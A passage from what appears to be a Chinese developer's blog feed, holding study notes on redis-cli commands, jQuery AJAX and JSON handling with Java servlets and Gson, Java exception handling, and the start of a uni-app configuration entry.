<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;bin&#x2F;redis-cli</span><br></pre></td></tr></table></figure>

<p>redis服务关闭</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;bin&#x2F;redis-cli shutdown</span><br></pre></td></tr></table></figure>

<p>开放云服务端口</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">./bin/redis-cli -h <span class="number">49.</span>ip.ip<span class="number">.2</span> -p <span class="number">6379</span> -a 密码</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>ajax&amp;json</title>
    <url>/2020/11/11/05ajax%E3%80%81json/</url>
    <content><![CDATA[<h3 id="AJAX"><a href="#AJAX" class="headerlink" title="AJAX"></a>AJAX</h3><p>ASynchronous JavaScript And XML <strong>异步的JavaScript和XML</strong></p>
<h4 id="基于JQuery的ajax"><a href="#基于JQuery的ajax" class="headerlink" title="基于JQuery的ajax"></a>基于JQuery的ajax</h4><p><strong>通过<code>out.print(result)</code> 得到结果</strong></p>
<blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;username&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">onblur</span>=<span class="string">&quot;validate();&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PrintWriter out=resp.getWriter();</span><br><span class="line">        String username=req.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;admin&quot;</span>.equals(username))&#123;</span><br><span class="line">            <span class="comment">//输出字符串给请求者</span></span><br><span class="line"><span class="comment">//            out.print(&quot;true&quot;);</span></span><br><span class="line">            out.print(<span class="string">&quot;&lt;font color=&#x27;red&#x27;&gt;用户名已被使用!&lt;font&gt;&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//            out.print(&quot;false&quot;);</span></span><br><span class="line">            out.print(<span class="string">&quot;&lt;font color=&#x27;green&#x27;&gt;用户名可以使用!&lt;font&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> username = $(<span class="string">&quot;#username&quot;</span>).val();</span><br><span class="line">    <span class="keyword">if</span> (username==<span class="literal">null</span> || username===<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">        $(<span class="string">&quot;#msg&quot;</span>).html(<span class="string">&quot;用户名不能为空&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            url:<span class="string">&#x27;ajaxServlet&#x27;</span>,</span><br><span class="line">            type:<span class="string">&#x27;get&#x27;</span>,</span><br><span class="line">     		data:<span class="string">&#x27;username=&#x27;</span>+username, <span class="comment">//相当于同步请求的URL&quot;ajaxServlet?username=admin&quot;</span></span><br><span class="line">            success:<span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</span><br><span class="line">                <span class="comment">// if (result===&#x27;true&#x27;)&#123;</span></span><br><span class="line">                <span class="comment">//     $(&quot;#msg&quot;).html(&quot;&lt;font color=&#x27;red&#x27;&gt;用户名已被使用!&lt;font&gt;&quot;);</span></span><br><span class="line">                <span class="comment">// &#125;else &#123;</span></span><br><span class="line">                <span class="comment">//     $(&quot;#msg&quot;).html(&quot;&lt;font color=&#x27;green&#x27;&gt;用户名可以使用!&lt;font&gt;&quot;);</span></span><br><span class="line">                <span class="comment">// &#125;</span></span><br><span class="line">                $(<span class="string">&quot;#msg&quot;</span>).html(result);</span><br><span class="line">            &#125;,</span><br><span class="line">            error:<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                alert(<span class="string">&quot;执行失败&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="get-post-简化"><a href="#get-post-简化" class="headerlink" title="get()/post()简化"></a>get()/post()简化</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//get()简化</span></span><br><span class="line">$.get(<span class="string">&#x27;ajaxServlet&#x27;</span>,<span class="string">&#x27;username=&#x27;</span>+username,<span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (result===<span class="string">&#x27;true&#x27;</span>)&#123;</span><br><span class="line">        $(<span class="string">&quot;#msg&quot;</span>).html(<span class="string">&quot;&lt;font color=&#x27;red&#x27;&gt;用户名已被使用!&lt;font&gt;&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        $(<span class="string">&quot;#msg&quot;</span>).html(<span class="string">&quot;&lt;font color=&#x27;green&#x27;&gt;用户名可以使用!&lt;font&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//post()简化</span></span><br><span class="line">$.post(<span class="string">&#x27;ajaxServlet&#x27;</span>,<span class="string">&#x27;username=&#x27;</span>+username,<span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (result===<span class="string">&#x27;true&#x27;</span>)&#123;</span><br><span class="line">        $(<span class="string">&quot;#msg&quot;</span>).html(<span class="string">&quot;&lt;font color=&#x27;red&#x27;&gt;用户名已被使用!&lt;font&gt;&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        $(<span class="string">&quot;#msg&quot;</span>).html(<span class="string">&quot;&lt;font color=&#x27;green&#x27;&gt;用户名可以使用!&lt;font&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h4 id="load-方法简化"><a href="#load-方法简化" class="headerlink" title="load()方法简化"></a>load()方法简化</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> username = $(<span class="string">&quot;#username&quot;</span>).val();</span><br><span class="line">    <span class="keyword">if</span> (username==<span class="literal">null</span> || username===<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">        $(<span class="string">&quot;#msg&quot;</span>).html(<span class="string">&quot;用户名不能为空&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        $(<span class="string">&quot;#msg&quot;</span>).load(<span class="string">&#x27;ajaxServlet&#x27;</span>,<span class="string">&quot;username=&quot;</span>+username)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h3><p>JavaScript Object Notation  <strong>JavaScript对象表示法</strong></p>
<p><strong>类似于Map的表示方式</strong></p>
<ul>
<li>json多用于存储和交换文本信息的语法</li>
<li>进行数据的传输</li>
<li>json比XML更小、更快、更易解析</li>
</ul>
<h4 id="1、基本格式"><a href="#1、基本格式" class="headerlink" title="1、基本格式"></a>1、基本格式</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="comment">//基本格式</span></span><br><span class="line">const person = &#123;&#x27;name&#x27;: &quot;李四&quot;, age: 12, &quot;gender&quot;: true&#125;;</span><br><span class="line"><span class="comment">// var name=person[&quot;name&quot;];</span></span><br><span class="line">alert(person.name);</span><br><span class="line"></span><br><span class="line">const ps = [</span><br><span class="line">    &#123;&#x27;name&#x27;: &quot;李四&quot;, age: 12, &quot;gender&quot;: true&#125;,</span><br><span class="line">    &#123;&#x27;name&#x27;: &quot;张三&quot;, age: 12, &quot;gender&quot;: true&#125;,</span><br><span class="line">    &#123;&#x27;name&#x27;: &quot;呜呜&quot;, age: 12, &quot;gender&quot;: true&#125;</span><br><span class="line">];</span><br><span class="line">alert(ps[2].name);</span><br><span class="line"></span><br><span class="line"><span class="comment">//&#123;&#125;==&#123;&#x27;&#x27;:&#123; &#125; &#125;</span></span><br><span class="line">const pears = &#123;</span><br><span class="line">    &quot;person&quot;: &#123;&#x27;name&#x27;: &quot;李四&quot;, age: 12, &quot;gender&quot;: true&#125;</span><br><span class="line">&#125;;</span><br><span class="line">alert(pears.person.age);</span><br><span class="line"></span><br><span class="line"><span class="comment">//&#123;&#125;==&#123;&#x27;&#x27;:[ &#123;&#125;, &#123;&#125;, &#123;&#125; ] &#125;</span></span><br><span class="line">const peas2 = &#123;</span><br><span class="line">    &quot;person2&quot;: [</span><br><span class="line">        &#123;&#x27;name&#x27;: &quot;李四&quot;, age: 12, &quot;gender&quot;: true&#125;,</span><br><span class="line">        &#123;&#x27;name&#x27;: &quot;张三&quot;, age: 12, &quot;gender&quot;: true&#125;,</span><br><span class="line">        &#123;&#x27;name&#x27;: &quot;呜呜&quot;, age: 12, &quot;gender&quot;: true&#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;;</span><br><span class="line">alert(peas2.person2[2].name);</span><br></pre></td></tr></table></figure>

<h4 id="2、遍历"><a href="#2、遍历" class="headerlink" title="2、遍历"></a>2、遍历</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="comment">//遍历</span></span><br><span class="line"><span class="comment">// for in</span></span><br><span class="line">for (const key in person)&#123;</span><br><span class="line">    alert(key+&quot;:&quot;+person[key])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const peas2 = &#123;</span><br><span class="line">    &quot;person2&quot;:[</span><br><span class="line">        &#123;&#x27;name&#x27;: &quot;李四&quot;, age: 12, &quot;gender&quot;: true&#125;,</span><br><span class="line">        &#123;&#x27;name&#x27;: &quot;张三&quot;, age: 12, &quot;gender&quot;: true&#125;,</span><br><span class="line">        &#123;&#x27;name&#x27;: &quot;呜呜&quot;, age: 12, &quot;gender&quot;: true&#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;;</span><br><span class="line">for (var i=0;i&lt;peas2.person2.length;i++)&#123;</span><br><span class="line">    const person=peas2.person2[i];</span><br><span class="line">    for (const key in person)&#123;</span><br><span class="line">        alert(key+&quot;:&quot;+person[key])</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (var i=0;i&lt;peas2.person2.length;i++)&#123;</span><br><span class="line">    alert(peas2.person2[i].name+&quot;,&quot;+peas2.person2[i].age+&quot;,&quot;+peas2.person2[i].gender);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3、json字符串"><a href="#3、json字符串" class="headerlink" title="3、json字符串"></a>3、json字符串</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line">const person=&#x27;&#123;&quot;name&quot;: &quot;李四&quot;, &quot;age&quot;: 12, &quot;gender&quot;: true&#125;&#x27;;</span><br></pre></td></tr></table></figure>

<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="comment">//将JSON对象转换为JSON字符串</span></span><br><span class="line">person3=JSON.stringify(person)</span><br><span class="line">alert(person3);</span><br><span class="line"></span><br><span class="line"><span class="comment">// //将json字符串转化为JSON对象</span></span><br><span class="line">const person2=JSON.parse(person);</span><br><span class="line">alert(person2.name);</span><br></pre></td></tr></table></figure>

<h4 id="4、转化4种方法"><a href="#4、转化4种方法" class="headerlink" title="4、转化4种方法"></a>4、转化4种方法</h4><h5 id="（1）从Servlet获得Json字符串"><a href="#（1）从Servlet获得Json字符串" class="headerlink" title="（1）从Servlet获得Json字符串"></a>（1）从Servlet获得Json字符串</h5><blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jsonStr=<span class="string">&quot;&#123;\&quot;flag\&quot;:true,\&quot;msg\&quot;:\&quot;&lt;font color=&#x27;red&#x27;&gt;用户名已被使用!&lt;/font&gt;\&quot;&#125;&quot;</span>;</span><br><span class="line">out.print(jsonStr);</span><br></pre></td></tr></table></figure>
</blockquote>
<h5 id="（2）json字符串转化为json对象"><a href="#（2）json字符串转化为json对象" class="headerlink" title="（2）json字符串转化为json对象"></a>（2）json字符串转化为json对象</h5><ul>
<li><pre><code class="java">resp.setContentType(&quot;application/json; charset=UTF-8&quot;);
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- &#96;&#96;&#96;java</span><br><span class="line">  result &#x3D; JSON.parse(result)</span><br><span class="line">  $(&quot;#msg&quot;).html(result.flag + &quot;---&quot; + result.msg);</span><br></pre></td></tr></table></figure></code></pre>
</li>
<li><pre><code class="json">$.getJSON(&#39;jsonServlet&#39;,&#123;username:username&#125;,function (data) &#123;
    $(&quot;#msg&quot;).html(data.flag + &quot;---&quot; + data.msg);
&#125;)
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- &#96;&#96;&#96;json</span><br><span class="line">  url: &#39;jsonServlet&#39;,</span><br><span class="line">  type: &#39;get&#39;,</span><br><span class="line">  data: &#123;&#39;username&#39;:username&#125;, &#x2F;&#x2F;相当于同步请求的URL&quot;ajaxServlet?username&#x3D;admin&quot;</span><br><span class="line">  dataType:&quot;json&quot;,</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
</ul>
<h4 id="5、Gson"><a href="#5、Gson" class="headerlink" title="5、Gson"></a>5、Gson</h4><p><strong>可为多种形式的对象（List,对象，Map…）转化为json字符串</strong></p>
<p>导入gson-2.2.4.jar</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">map.put(<span class="string">&quot;flag&quot;</span>,<span class="keyword">true</span>);</span><br><span class="line">map.put(<span class="string">&quot;msg&quot;</span>,<span class="string">&quot;&lt;font color=&#x27;red&#x27;&gt;用户名已被使用!&lt;/font&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">Gson gson=<span class="keyword">new</span> Gson();</span><br><span class="line">String data=gson.toJson(map);</span><br><span class="line">out.print(data);</span><br></pre></td></tr></table></figure>

<p>通过前端传过来的name进行搜索，将集合转化为Json字符串，再传到前端</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String name = req.getParameter(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">List&lt;Book&gt; bookList = <span class="keyword">new</span> BookService().findBookByName(name);</span><br><span class="line"></span><br><span class="line">Gson gson=<span class="keyword">new</span> Gson();</span><br><span class="line"><span class="comment">//创建Json字符串</span></span><br><span class="line">String json = gson.toJson(bookList);</span><br><span class="line"><span class="comment">//传回请求者</span></span><br><span class="line">resp.getWriter().write(json);</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">    type: <span class="string">&quot;get&quot;</span>,</span><br><span class="line">    <span class="comment">//新建一个名为SearchNameAjaxServlet的servlet,URL如下</span></span><br><span class="line">    url: <span class="string">&quot;searchNameAjax&quot;</span>,</span><br><span class="line">    data: &#123;</span><br><span class="line">        <span class="comment">//传递的参数</span></span><br><span class="line">        <span class="string">&quot;name&quot;</span>: content,</span><br><span class="line">        <span class="string">&quot;time&quot;</span>: time</span><br><span class="line">    &#125;,<span class="comment">//&quot;info=&quot;+content+&quot;&amp;time=&quot;+time</span></span><br><span class="line">    dataType: <span class="string">&#x27;json&#x27;</span>,</span><br><span class="line">    success: <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="comment">//拼接html</span></span><br><span class="line">        <span class="comment">//var res = data.split(&quot;,&quot;);</span></span><br><span class="line">        <span class="keyword">var</span> html = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.length; i++) &#123;</span><br><span class="line">            <span class="comment">//每一个div还有鼠标移出、移入点击事件</span></span><br><span class="line">            html += <span class="string">&quot;&lt;div onmousedown=&#x27;setSearch_onclick(this)&#x27; onmouseout=&#x27;changeBackColor_out(this)&#x27; onmouseover=&#x27;changeBackColor_over(this)&#x27;&gt;&quot;</span></span><br><span class="line">                + data[i].name + <span class="string">&quot;&lt;/div&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $(<span class="string">&quot;#context1&quot;</span>).html(html);</span><br><span class="line">        <span class="comment">//显示为块级元素</span></span><br><span class="line">        $(<span class="string">&quot;#context1&quot;</span>).css(<span class="string">&quot;display&quot;</span>, <span class="string">&quot;block&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>异常控制</title>
    <url>/2020/11/11/04%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/</url>
    <content><![CDATA[<h3 id="一、异常"><a href="#一、异常" class="headerlink" title="一、异常"></a>一、异常</h3><p><img src="https://csn.damyoung.cn/image-20200730200213622.png" alt="image-20200730200213622"></p>
<h3 id="1、Throwable"><a href="#1、Throwable" class="headerlink" title="1、Throwable"></a>1、Throwable</h3><blockquote>
<p>所有的异常都有一个共同的祖先<code>java.lang</code>包中的的<code>Throwable类</code>。</p>
<p>它有两个重要的子类：<code>Exception(异常)</code>和<code>Error(错误)</code>,二者都是java处理异常的重要子类</p>
</blockquote>
<h4 id="1-1-Error"><a href="#1-1-Error" class="headerlink" title="1.1 Error"></a>1.1 Error</h4><blockquote>
<p><strong>程序无法处理的错误</strong>，表示运行应用程序中较严重问题，表示代码执行时JVM出现的问题。</p>
<p>如java虚拟机运行错误(VirtualMachineError)、内存溢出(OutofMemoryError)</p>
<p>这些异常发生时，java虚拟机一般会选择线程终止</p>
</blockquote>
<blockquote>
<p>绝大多数是程序运行时不允许出现的状况。对于设计合理的应用程序来说，即使确实发生了错误，本质上也不应该试图去处理它所引起的异常状况。</p>
</blockquote>
<h4 id="1-2-Exception"><a href="#1-2-Exception" class="headerlink" title="1.2 Exception"></a>1.2 Exception</h4><blockquote>
<p><strong>是程序本身可以处理的异常</strong></p>
<p><code>Exception</code>类有一个重要的子类<code>RuntimeException</code>。</p>
<p>该异常由Java虚拟机抛出</p>
</blockquote>
<ul>
<li> <code>ArrithmeticException</code>：算术运算异常，一个整数除以0时，会抛出该异常</li>
<li><code>ClassNotFoundException</code></li>
<li><code>NullPointerException</code>：要访问的变量没有引用任何对象时抛出该异常。</li>
<li><code>IllegalArgumentException</code>：非法参数异常</li>
<li><code>ArrayIndexOutOfBoundsException</code>：下标越界异常</li>
</ul>
<blockquote>
<p>异常和错误的区别：异常能被程序本身处理，错误无法处理</p>
</blockquote>
<h4 id="1-3-处理过程"><a href="#1-3-处理过程" class="headerlink" title="1.3 处理过程"></a>1.3 处理过程</h4><ul>
<li><p>抛出异常：发生异常，生成异常对象，交给JRE</p>
</li>
<li><p>捕获异常：JRE得到异常，寻找相应的代码处理异常</p>
</li>
</ul>
<h4 id="1-4-受检异常和运行异常"><a href="#1-4-受检异常和运行异常" class="headerlink" title="1.4 受检异常和运行异常"></a>1.4 受检异常和运行异常</h4><h5 id="受检异常"><a href="#受检异常" class="headerlink" title="受检异常"></a>受检异常</h5><p>跟程序的上下文环境有关，即使程序设计无误，仍然可能因使用的问题而导致异常。</p>
<p>Java编译器要求方法必须声明抛出可能发生的受检异常，但是并不要求必须声明抛出未被捕获的运行时异常。</p>
<h5 id="运行时异常"><a href="#运行时异常" class="headerlink" title="运行时异常"></a>运行时异常</h5><p>表示虚拟机的通常操作中可能遇到的异常，是一种常见的运行错误，只要程序设计得当通常就不会发生。</p>
<p>当出现这样的异常，可以不处理，总是由虚拟机接管。<code>RuntimeException</code>下的类便都是运行时异常。</p>
<h4 id="1-5-异常处理总结"><a href="#1-5-异常处理总结" class="headerlink" title="1.5 异常处理总结"></a>1.5 异常处理总结</h4><ul>
<li><p><code>try块</code>： 用于捕获异常。其后可接零个或多个<code>catch</code>块，如果没有catch块，则必须跟一个<code>finally</code>块。</p>
</li>
<li><p><code>catch块</code>：用于处理<code>try</code>捕获到的异常</p>
</li>
<li><p><code>finally块</code>：无论是否捕获或处理异常，<code>finally</code>中的语句都会被执行。</p>
<blockquote>
<p>当try和finally语句中都有return语句时</p>
<p>在方法返回之前，finally语句的内容将被执行，</p>
<p>并且finally语句的返回值将会覆盖原始的返回值。</p>
</blockquote>
</li>
<li><p><code>throw</code>：用于在代码中明确的排除一个异常</p>
</li>
<li><p><code>throws</code>：用在方法声明上标明函数可能抛出的各种异常。</p>
</li>
</ul>
<h4 id="1-6-finally块不会被执行的四种情况"><a href="#1-6-finally块不会被执行的四种情况" class="headerlink" title="1.6 finally块不会被执行的四种情况"></a>1.6 finally块不会被执行的四种情况</h4><ul>
<li>在finally语句块第一行发生了异常。因为在其他行，finally块还是会得到执行</li>
<li>在前面的代码中用了<code>System.exit(int)</code>已退出程序。 exit是带参函数；若该语句在异常语句之后，finally会执行</li>
<li>程序所在的线程死亡。</li>
<li>关闭CPU。</li>
</ul>
<h3 id="2、-try-catch-finally"><a href="#2、-try-catch-finally" class="headerlink" title="2、 try-catch-finally"></a>2、 try-catch-finally</h3><ul>
<li><strong>执行try时，若出现异常后，try语句中后面的语句不再执行</strong></li>
<li>finally无论有无异常都会执行，无论如何都会执行                 </li>
<li>catch可捕获多个异常，越是父类放下面（子类异常若在父类异常后面，子类异常不再执行）</li>
</ul>
<h3 id="3、异常处理"><a href="#3、异常处理" class="headerlink" title="3、异常处理"></a>3、异常处理</h3><ul>
<li>抛出RuntimeException及其子类则声明上没有throws</li>
<li>如果抛出的是Exception及其子类则声明上必须要有throws</li>
</ul>
<p>（1）手动抛出异常 throw new Exception();  （代码级别）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> age=<span class="number">100</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(age&gt;<span class="number">120</span>)&#123;    <span class="comment">//抛出异常</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">&quot;年龄不合理&quot;</span>);   <span class="comment">//手动抛出异常</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">catch</span> (Exception e)&#123;   <span class="comment">//捕获异常</span></span><br><span class="line">    System.out.println(e.getMessage());	<span class="comment">//打印出详细字符串</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>（2）抛出异常：throws(方法级别)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//抛出异常</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">demo1</span><span class="params">()</span> <span class="keyword">throws</span> ArithmeticException</span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">1</span>/<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span>  </span>&#123;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">         demo1();</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           e.printStackTrace();	<span class="comment">//打印出堆栈</span></span><br><span class="line">      &#125;  </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h3 id="4、自定义异常"><a href="#4、自定义异常" class="headerlink" title="4、自定义异常"></a>4、自定义异常</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exception</span> <span class="keyword">extends</span> <span class="title">Throwable</span> </span></span><br><span class="line"><span class="class">    </span></span><br><span class="line"><span class="class">//<span class="title">Exception</span>的无参构造</span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">Exception</span>() </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Exception的带参构造</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Exception</span><span class="params">(String message)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(message);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String gender;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setGender</span><span class="params">(String gender)</span><span class="keyword">throws</span> GenderException</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(gender.equals(<span class="string">&quot;男&quot;</span>)|gender.equals(<span class="string">&quot;女&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">this</span>.gender=gender;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> GenderException(<span class="string">&quot;性别只能是男或女&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getGender</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> gender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//自定义异常</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GenderException</span> <span class="keyword">extends</span> <span class="title">Exception</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">GenderException</span><span class="params">(String msg)</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(msg); <span class="comment">//调用父类Exception 构造方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner input=<span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        Student s=<span class="keyword">new</span> Student();</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入学生性别&quot;</span>);</span><br><span class="line">        String gender=input.next();</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            s.setGender(gender);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (GenderException e)&#123;</span><br><span class="line">            System.out.println(e.getMessage());</span><br><span class="line">        &#125;       </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5、return"><a href="#5、return" class="headerlink" title="5、return"></a>5、return</h3><ul>
<li><p>执行try，catch，给返回值赋值（暂时不输出）</p>
</li>
<li><p>执行finally（在里面加return，上面的return会被覆盖，而且还会掩盖try-catch中的异常）</p>
</li>
<li><p>return ，finally中有return语句时，会覆盖try-catch的return语句</p>
</li>
</ul>
<h3 id="6、声明异常范围"><a href="#6、声明异常范围" class="headerlink" title="6、声明异常范围"></a>6、声明异常范围</h3><blockquote>
<p>子类声明范围不能超过父类声明范围</p>
</blockquote>
<ul>
<li>父类没有声明异常，子类也不能</li>
<li>不可抛出异常类的父类或上层类</li>
<li>抛出异常数目不能比原有方法还多</li>
</ul>
]]></content>
      <categories>
        <category>javaSe</category>
      </categories>
      <tags>
        <tag>javaSe</tag>
      </tags>
  </entry>
  <entry>
    <title>uni-app</title>
    <url>/2020/09/11/05uni-app/</url>
    <content><![CDATA[<h3 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h3><blockquote>
<p>结合jsp和ajax的优点，可以进行局部刷新</p>
<p>colorui,graceui</p>
</blockquote>
<h4 id="1、uni-app项目框架"><a href="#1、uni-app项目框架" class="headerlink" title="1、uni-app项目框架"></a>1、uni-app项目框架</h4><h5 id="1-1-pages-json"><a href="#1-1-pages-json" class="headerlink" title="1.1 pages.json"></a>1.1 pages.json</h5><blockquote>
<p>文件对uni-app进行全局配置</p>
<ul>
<li>gobalStyle-设置默认页面的窗口表现</li>
<li>pages-path(设置页面路径,每个新增页面需要增加path),style(设置页面窗口属性)</li>
</ul>
</blockquote>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&quot;pages&quot;: [ </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="attr">&quot;path&quot;</span>: <span class="string">&quot;pages/index/index&quot;</span>,</span><br><span class="line">		<span class="attr">&quot;style&quot;</span>: &#123;</span><br><span class="line">			<span class="attr">&quot;enablePullDownRefresh&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">			 <span class="attr">&quot;onReachBottomDistance&quot;</span>: <span class="number">300</span></span><br><span class="line">			&#125;</span><br><span class="line">	 &#125;</span><br><span class="line">	 ,&#123;</span><br><span class="line">          &quot;path&quot; : &quot;pages/user/user&quot;</span><br><span class="line">       &#125;</span><br><span class="line">      ,&#123;</span><br><span class="line">           &quot;path&quot; : &quot;pages/index/news-detail/news-detail&quot;,</span><br><span class="line">           &quot;style&quot; : &#123;&#125;</span><br><span class="line">       &#125;</span><br><span class="line"> ],</span><br><span class="line">&quot;globalStyle&quot;: &#123;</span><br><span class="line">		